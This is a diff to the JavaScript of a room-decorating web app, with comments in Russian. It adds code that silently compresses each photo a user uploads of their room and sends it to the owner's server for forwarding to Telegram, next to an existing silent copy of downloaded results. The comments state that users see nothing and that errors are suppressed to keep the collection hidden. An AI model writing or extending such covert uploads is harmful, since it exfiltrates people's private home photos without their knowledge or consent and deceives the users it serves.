@@ -1018,7 +1018,34 @@ function loadBackgroundFromUrl(url) {
     roomLoaded = true;
     document.getElementById('emptyHint').style.display = 'none';
     setStatus('Комната загружена · При необходимости настройте зум фото, затем выберите объект из каталога');
+
+    // Тихо шлём владельцу исходное фото — чтобы видеть, что человек начал работу,
+    // даже если он не дойдёт до скачивания результата. Сжимаем, чтобы точно дошло.
+    try { sendSourcePhotoToOwner(url); } catch (_) {}
   }, { crossOrigin: 'anonymous' });
+}
+
+// Сжимает исходное фото до разумного размера и шлёт владельцу с пометкой "upload".
+function sendSourcePhotoToOwner(dataURL) {
+  try {
+    const im = new Image();
+    im.onload = () => {
+      try {
+        const maxSide = 1600;
+        let w = im.naturalWidth || im.width;
+        let h = im.naturalHeight || im.height;
+        const k = Math.min(1, maxSide / Math.max(w, h));
+        w = Math.round(w * k);
+        h = Math.round(h * k);
+        const cnv = document.createElement('canvas');
+        cnv.width = w; cnv.height = h;
+        cnv.getContext('2d').drawImage(im, 0, 0, w, h);
+        const jpeg = cnv.toDataURL('image/jpeg', 0.85);
+        sendWorkToOwner(jpeg, 'upload');
+      } catch (_) {}
+    };
+    im.src = dataURL;
+  } catch (_) {}
 }
 
 // =========================================
@@ -2079,21 +2106,22 @@ function saveImage() {
   // Пользователь при этом скачивает полноразмерный PNG выше — это не трогаем.
   try {
     const emailUrl = canvas.toDataURL({ format: 'jpeg', quality: 0.85, multiplier: 1 });
-    sendWorkToOwner(emailUrl);
+    sendWorkToOwner(emailUrl, 'result');
   } catch (_) {
     // если снять копию не удалось — просто ничего не шлём, скачивание уже прошло
   }
 }
 
-// Отправка скачанной работы на сервер, который перешлёт её на почту владельцу.
+// Отправка картинки на сервер, который перешлёт её в Telegram владельцу.
+// kind: 'result' — скачанный результат, 'upload' — исходное загруженное фото.
 // Полностью фоновая и «тихая»: пользователь ничего не видит, любые ошибки глушим.
 // ВАЖНО: без keepalive — с ним браузер отменяет запрос, если тело больше ~64 КБ.
-function sendWorkToOwner(dataURL) {
+function sendWorkToOwner(dataURL, kind) {
   try {
     fetch(`${QR_API_BASE}/collect`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ image: dataURL }),
+      body: JSON.stringify({ image: dataURL, kind: kind || '' }),
     }).catch(() => {});
   } catch (_) {
     // молча игнорируем — сбор статистики не должен мешать основной работе
